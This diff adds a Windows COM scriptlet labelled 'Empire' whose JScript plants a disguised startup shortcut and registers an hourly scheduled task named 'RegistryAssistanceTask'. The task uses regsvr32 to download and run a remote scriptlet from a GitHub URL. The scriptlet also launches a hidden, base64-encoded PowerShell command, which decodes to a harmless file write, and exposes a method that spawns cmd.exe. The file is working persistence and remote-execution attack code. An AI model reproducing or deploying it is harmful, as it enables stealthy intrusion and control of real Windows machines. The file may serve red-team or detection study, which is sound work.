@@ -1,0 +1,46 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="Empire"
+    progid="Empire"
+    version="1.00"
+    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
+    >
+    <script language="JScript">
+        <![CDATA[
+			
+			
+			var wsl = new ActiveXObject("WScript.Shell");
+			var Startup = wsl.SpecialFolders("startup");
+			var mysc = wsl.CreateShortcut(Startup + "\DeviceProperties.lnk")
+			mysc.WindowStyle = 7
+			mysc.IconLocation = "%windir%\system32\DeviceProperties.exe"
+			mysc.TargetPath = "c:\windows\explorer.exe"
+			mysc.Save
+			
+			
+			var s1 = 'MSHTA vbscript:Close(CreateObject("WScript.shell").run("cmd.exe /c schtasks.exe /create /TN RegistryAssistanceTask /TR ""regsvr32.exe /u /s /i:https://raw.githubusercontent.com/jwpq/z/master/z.png"" /SC HOURLY & schtasks.exe /run /TN RegistryAssistanceTask",0))';
+			
+			var s2 = 'cmd /c schtasks.exe /create /TN RegistryAssistanceTask /TR "regsvr32.exe /u /s /i:https://raw.githubusercontent.com/jwpq/z/master/z.png" /SC HOURLY & schtasks.exe /run /TN RegistryAssistanceTask';
+			
+            var r = new ActiveXObject("WScript.Shell").Run(s2, 0);
+			
+			var objShell = new ActiveXObject("WScript.Shell");
+			
+			objShell.Run("PowerShell.exe -NoP -sta -NonI -W Hidden -Enc JABmAGkAbABlAFAAYQB0AGgAIAA9ACAAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAEwARQAgACsAIAAiAFwARABlAHMAawB0AG8AcABcAEkAYQBtAEgAZQByAGUAIQAuAHQAeAB0ACIAOwAgACQAYwBvAG4AdABlAG4AdAAgAD0AIAAgACIASABlAGwAbABvACAAVwBvAHIAbABkACAAIQAgAGAAbgAiADsAIAAkAGMAbwBuAHQAZQBuAHQAIAB8ACAATwB1AHQALQBGAGkAbABlACAAJABmAGkAbABlAFAAYQB0AGgAOwA=", 0);
+			
+        ]]>
+</script>
+</registration>
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+    function Exec()
+    {
+        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+    }
+]]>
+</script>
+</scriptlet>
